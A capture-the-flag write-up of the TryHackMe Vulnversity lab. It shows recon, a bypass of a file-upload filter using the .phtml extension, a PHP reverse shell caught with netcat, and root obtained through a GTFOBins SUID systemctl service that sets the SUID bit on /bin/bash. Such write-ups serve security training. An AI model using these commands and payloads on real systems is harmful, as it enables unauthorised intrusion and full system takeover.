# 🚀 TryHackMe: Vulnversity Write-up

## 📌 Challenge Overview

* **Platform:** TryHackMe
* **Room:** Vulnversity
* **Category:** Web Exploitation, Privilege Escalation
* **Objective:**

  * Exploit a file upload vulnerability to gain initial access
  * Escalate privileges to **root** via SUID misconfiguration

---

## 🔍 1. Reconnaissance

### 🛰️ Port Scanning

We begin with an **Nmap scan** to identify open ports and services:

```bash
nmap -sC -sV -p- -oN nmap/initial <TARGET_IP>
```

### 📊 Results

| Port | Service | Version      |
| ---- | ------- | ------------ |
| 21   | FTP     | vsftpd 3.0.3 |
| 22   | SSH     | OpenSSH      |
| 139  | SMB     | NetBIOS      |
| 445  | SMB     | NetBIOS      |
| 3128 | Proxy   | Squid 3.5.12 |
| 3333 | HTTP    | Apache       |

📌 The target appears to be running **Ubuntu**.

---

### 🌐 Web Enumeration

Accessing the web server:

```
http://<TARGET_IP>:3333
```

We find a static university page.

#### 🔎 Directory Brute-force

```bash
gobuster dir -u http://<TARGET_IP>:3333 \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

✅ Discovered:

```
/internal/
```

---

## 💥 2. Initial Access

### 📤 Exploiting File Upload

Navigating to:

```
http://<TARGET_IP>:3333/internal/
```

We find a **file upload form**.

* Uploading `.php` → ❌ Blocked
* Bypass strategy → Test alternative extensions

#### 🐍 Custom Python Script

Used Python `requests` to fuzz extensions:

```python
extensions = [".php3", ".php4", ".php5", ".phtml"]
```

✅ Result:

```
.phtml → Allowed
```

---

### 🐚 Gaining Reverse Shell

1. Download reverse shell from PentestMonkey
2. Modify attacker IP & port
3. Rename file:

```
revshell.phtml
```

4. Upload payload

#### 🎧 Start Listener

```bash
nc -lvnp 9001
```

#### ⚡ Trigger Shell

```
http://<TARGET_IP>:3333/internal/uploads/revshell.phtml
```

✅ Got shell as:

```
www-data
```

---

### 🧠 Stabilizing Shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

### 🏁 User Flag

```bash
cd /home/bill
cat user.txt
```

---

## 🔐 3. Privilege Escalation

### 🔍 Finding SUID Binaries

```bash
find / -type f -perm -4000 2>/dev/null
```

🚨 Interesting finding:

```
/bin/systemctl
```

---

### ⚙️ Exploiting systemctl (SUID)

Using **GTFOBins technique**, we create a malicious service.

#### 🛠️ Create Service File

```bash
TF=$(mktemp).service

echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
```

#### 🚀 Execute Service

```bash
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

---

### 🔓 Root Access

Check bash permissions:

```bash
ls -l /bin/bash
```

✅ SUID bit set

Now escalate:

```bash
/bin/bash -p
```

🎉 **Root shell obtained!**

---

### 🏁 Root Flag

```bash
cd /root
cat root.txt
```

---

## 🧠 Key Takeaways

* File upload filters can be bypassed using alternative extensions
* Always test uncommon file extensions like `.phtml`
* SUID misconfigurations are critical privilege escalation vectors
* GTFOBins is an essential resource for exploitation

---

## 🛠️ Tools Used

* Nmap
* Gobuster
* Netcat
* Python (requests)
* GTFOBins

---

## 📚 References

* [https://gtfobins.github.io](https://gtfobins.github.io)
* [https://tryhackme.com](https://tryhackme.com)

---

## ✍️ Author

**Muhammad Taher**
Cyber Security Enthusiast | CTF Player

---
